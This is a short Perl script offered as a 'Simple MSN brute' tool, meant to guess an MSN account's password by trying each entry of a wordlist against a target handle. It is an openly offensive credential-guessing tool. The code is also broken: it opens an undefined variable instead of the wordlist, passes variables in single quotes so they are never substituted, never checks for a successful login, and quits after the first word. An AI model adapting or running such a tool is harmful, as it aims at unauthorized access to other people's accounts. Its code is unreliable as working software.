#!/usr/bin/perl
#
#
# Simple MSN brute 
# auhtor -> ArkAngeL43
# perl 5.10.0



use lib qw(./MSN/lib);
# use msn
use MSN;
use strict;
use encoding "euc-jp";
use Getopt::Std;

my %opts = (
    a  => '',                   
    w => '',
);

# a = ip host 
# w = wordlist
getopt('a:w', \%opts);

my $target   = $opts{a};
my $wordlist = $opts{w}; 


open (D,"<$dict") or die "[*] FATAL: COULD NOT OPEN FILE\n";

while(<D>) {
    $try = $_;
    my $msn = MSN->new(Handle => '$target', Password => '$try');
    chomp $try;
    $counter++;
    $tiempo++;
    {
	print "$target | $try \n";
	last;
    }
    if($counter==$fallos) {
    }
}

close(D);

print "\n\n";
print "$tiempo Obtener pass";
print "\n\n";
print "c0dex by m0x.lk";